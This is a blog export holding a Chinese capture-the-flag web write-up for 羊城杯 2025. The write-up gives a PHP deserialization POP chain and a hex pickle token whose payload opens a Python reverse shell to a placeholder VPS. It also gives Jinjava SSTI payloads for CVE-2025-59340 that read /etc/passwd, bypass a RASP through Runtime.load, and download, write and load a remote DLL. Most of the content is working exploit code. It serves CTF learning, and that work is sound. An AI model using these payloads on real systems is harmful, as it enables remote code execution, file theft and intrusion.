<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025 羊城杯 WEB WP (含 金Java )</title>
      <link href="/2025/10/13/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WEB-WP-%E5%90%AB-%E9%87%91Java/"/>
      <url>/2025/10/13/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WEB-WP-%E5%90%AB-%E9%87%91Java/</url>
      
        <content type="html"><![CDATA[<h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who =  <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next = <span class="keyword">new</span> <span class="title function_ invoke__">V</span>();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;dowhat = <span class="string">&#x27;secret&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;go = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ser-&gt;who-&gt;next-&gt;go-&gt;found = new N();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;go-&gt;found = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;go-&gt;found-&gt;finalstep = <span class="string">&quot;u&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><h2 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h2><p>token中是一个十六进制的pickle</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># gen_token.py  </span></span><br><span class="line"><span class="comment"># 生成一个 pickle token（protocol 4），并以十六进制字符串输出  </span></span><br><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_user_token</span>(<span class="params">username=<span class="string">&quot;guest&quot;</span>, is_admin=<span class="literal">False</span>, logged_in=<span class="literal">True</span>, protocol=<span class="number">4</span></span>):  </span><br><span class="line">    opcode = <span class="string">b&#x27;&#x27;&#x27;cos  </span></span><br><span class="line"><span class="string">system  </span></span><br><span class="line"><span class="string">(S&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps_ip&quot;,vps_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)\&#x27;&#x27;  </span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span>  </span><br><span class="line">    <span class="comment"># 输出为 hex（小写），与你给出的格式一致（无前缀）  </span></span><br><span class="line">    hexstr = binascii.hexlify(opcode).decode(<span class="string">&#x27;ascii&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> hexstr, opcode  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    hexstr, raw = make_user_token()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Token (hex):&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(hexstr)  </span><br><span class="line">    <span class="comment"># 如果你喜欢以 &quot;Token=&quot; 前缀显示：  </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nToken=&quot;</span> + hexstr)</span><br></pre></td></tr></table></figure><h2 id="金Java-赛后"><a href="#金Java-赛后" class="headerlink" title="金Java(赛后)"></a>金Java(赛后)</h2><p>一道jinjava模板引擎的ssti<br>可以使用include去读取文件, 但只限于当前工作目录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include <span class="string">&#x27;META-INF/MANIFEST.MF&#x27;</span> %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013204949.png" alt="image.png"></p><p>BOOT-INF&#x2F;classpath.idx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &#x27;BOOT-INF/classpath.idx&#x27; %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-3.5.6.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-autoconfigure-3.5.6.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/logback-classic-1.5.18.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/logback-core-1.5.18.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/log4j-to-slf4j-2.24.3.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/log4j-api-2.24.3.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jul-to-slf4j-2.0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/snakeyaml-2.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-datatype-jsr310-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-module-parameter-names-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-core-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-el-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/tomcat-embed-websocket-10.1.46.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-web-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-beans-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/micrometer-observation-1.15.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/micrometer-commons-1.15.4.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-webmvc-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-aop-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-context-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-expression-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-core-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-jcl-6.2.11.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jinjava-2.8.0.jar&quot;</span>                  # jinjava版本</span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/slf4j-api-2.0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/guava-33.1.0-jre.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/failureaccess-1.0.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/checker-qual-3.42.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/error_prone_annotations-2.26.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/j2objc-annotations-3.0.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/javassist-3.24.1-GA.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/re2j-1.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/commons-lang3-3.17.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/commons-net-3.9.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/java-ipv6-0.17.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/annotations-3.0.1.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-annotations-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-databind-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-core-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-dataformat-yaml-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/jackson-datatype-jdk8-2.19.2.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/big-math-2.0.0.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/immutables-exceptions-1.9.jar&quot;</span></span><br><span class="line">- <span class="string">&quot;BOOT-INF/lib/spring-boot-jarmode-tools-3.5.6.jar&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看见远程使用的是jdk 17, jinjava版本为2.8.0<br>查看这个版本, 是存在漏洞的:<br><a href="https://mvnrepository.com/artifact/com.hubspot.jinjava/jinjava/2.8.0">https://mvnrepository.com/artifact/com.hubspot.jinjava/jinjava/2.8.0</a><br><a href="https://www.cve.org/CVERecord?id=CVE-2025-59340">https://www.cve.org/CVERecord?id=CVE-2025-59340</a></p><p>利用poc:<br><a href="https://www.miggo.io/vulnerability-database/cve/CVE-2025-59340">https://www.miggo.io/vulnerability-database/cve/CVE-2025-59340</a></p><p>这里披露了一条poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="type">set</span> <span class="variable">mapper</span> <span class="operator">=</span> ____int3rpr3t3r____.config.objectMapper %&#125;</span><br><span class="line">&#123;&#123; mapper.enableDefaultTyping() &#125;&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">file</span> <span class="operator">=</span> mapper.readValue(<span class="string">&#x27;&quot;file:///etc/passwd&quot;&#x27;</span>, mapper.getTypeFactory().constructFromCanonical(<span class="string">&#x27;java.net.URL&#x27;</span>)) %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">inputStream</span> <span class="operator">=</span> file.openStream() %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">bytes</span> <span class="operator">=</span> inputStream.readAllBytes() %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">stringType</span> <span class="operator">=</span> mapper.getTypeFactory().constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) %&#125;</span><br><span class="line">&#123;% <span class="type">set</span> <span class="variable">content</span> <span class="operator">=</span> mapper.convertValue(bytes, stringType) %&#125;</span><br><span class="line">&#123;&#123; content &#125;&#125;</span><br></pre></td></tr></table></figure><p>可以用来ssrf读文件, 但当我尝试读取&#x2F;flag时显示无权限, 尝试读取了一下 &#x2F;readflag, 发现能读出来, 那么说明题目是要我们构造rce了<br>先读一下 &#x2F;proc&#x2F;self&#x2F;cmdline</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java\x00-Xmx512m\x00-javaagent:/app/ycbRASP-<span class="number">1.0</span>-SNAPSHOT-dependencies.jar\x00-jar\x00/app/ezjin-<span class="number">0.0</span><span class="number">.1</span>-SNAPSHOT.jar\x00</span><br><span class="line"><span class="comment">// java -Xmx512m -javaagent:/app/ycbRASP-1.0-SNAPSHOT-dependencies.jar -jar /app/ezjin-0.0.1-SNAPSHOT.jar </span></span><br></pre></td></tr></table></figure><p>赛中没有做出了, 不过留了一手, 这里根据启动内容, 把这两个jar包读取下来保存到本地调试分析<br>首先是如何RCE?<br>一开始, 摸索了很久, 尝试构造执行Spel表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; </span><br><span class="line">____int3rpr3t3r____.config.objectMapper.convertValue( ____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;T(java.lang.Runtime).getRuntime().exec(&quot;cmd.exe /c whoami&quot;)&#x27;</span>).getValue().getInputStream().readAllBytes(), ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) )</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>很快就会发现, 题目的RASP拦截了Runtime.exec<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013210154.png" alt="image.png"><br>我们查看RASP的jar包内容, 被检测的类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] TARGET_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line"><span class="string">&quot;java.lang.UNIXProcess&quot;</span>, <span class="string">&quot;java.lang.ProcessImpl&quot;</span>, <span class="string">&quot;jdk.internal.process.UnixProcess&quot;</span>, <span class="string">&quot;jdk.internal.process.ProcessImpl&quot;</span>, <span class="string">&quot;jdk.internal.process.WindowsProcess&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>, <span class="string">&quot;java.io.ObjectInputStream&quot;</span>, <span class="string">&quot;javax.naming.InitialContext&quot;</span>, <span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>基本上直接命令执行, JNDI, JDI加载外部库 等都被封死了</p><p>但仔细看会发现, 对于<code>java.lang.Runtime</code>只禁了exec<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013210355.png" alt="image.png"></p><p>由于这里的<code>!&quot;java.lang.System&quot;</code>给了我一些灵感, 往下看<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013210849.png" alt="image.png"><br>他是禁掉了System.load, 当我查看其源码发现<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013211007.png" alt="image.png"></p><p>System.load实际上是调用了<code>Runtime.getRuntime().load0</code>, 跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013211048.png" alt="image.png"><br><code>Runtime</code>中亦有对<code>load0</code>的调用, 并且为public方法, 所以我可以直接使用<code>Runtime.getRuntime().load()</code>加载外部库,这可以绕过题目中的RASP,<br>由于我是在windows复现, 这里生成dll</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line"></span><br><span class="line">        WinExec(<span class="string">&quot;calc&quot;</span>, SW_SHOW);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为dll</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o calc.dll calc.c -luser32</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line"></span><br><span class="line">____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">T(java.lang.Runtime).getRuntime().load(&quot;D:/tmp/calc.dll&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>).getValue().getInputStream().readAllBytes()</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>在首次加载时可以成功弹出计算器!</p><p>接下来的问题是如何写入dll文件<br>当我尝试base64解码后写入时发现超出spel表达式长度了, 这里就先尝试出网利用, 从url中获取, python起一个http服务存放calc.dll</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ____int3rpr3t3r____.config.objectMapper.convertValue( ____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;T(java.nio.file.Files).readAllBytes(T(java.nio.file.Files).write(T(java.nio.file.Paths).get(&quot;D:/tmp/test/pwned.dll&quot;), new java.net.URL(&quot;http://127.0.0.1:8000/calc.dll&quot;).openStream().readAllBytes()))&#x27;</span>).getValue(), ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;java.lang.String&#x27;</span>) ) &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013211848.png" alt="image.png"><br>成功写入!<br>直接加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line"></span><br><span class="line">____int3rpr3t3r____.config.objectMapper.readValue(<span class="string">&#x27;&#123;&#125;&#x27;</span>, ____int3rpr3t3r____.config.objectMapper.typeFactory.constructFromCanonical(<span class="string">&#x27;org.springframework.expression.spel.standard.SpelExpressionParser&#x27;</span>)).parseExpression(<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">T(java.lang.Runtime).getRuntime().load(&quot;D:/tmp/test/pwned.dll&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>).getValue().getInputStream().readAllBytes()</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>成功RCE</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251013212035.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025软件系统安全赛 WEB JDBCParty</title>
      <link href="/2025/10/02/2025%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-WEB-JDBCParty/"/>
      <url>/2025/10/02/2025%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B-WEB-JDBCParty/</url>
      
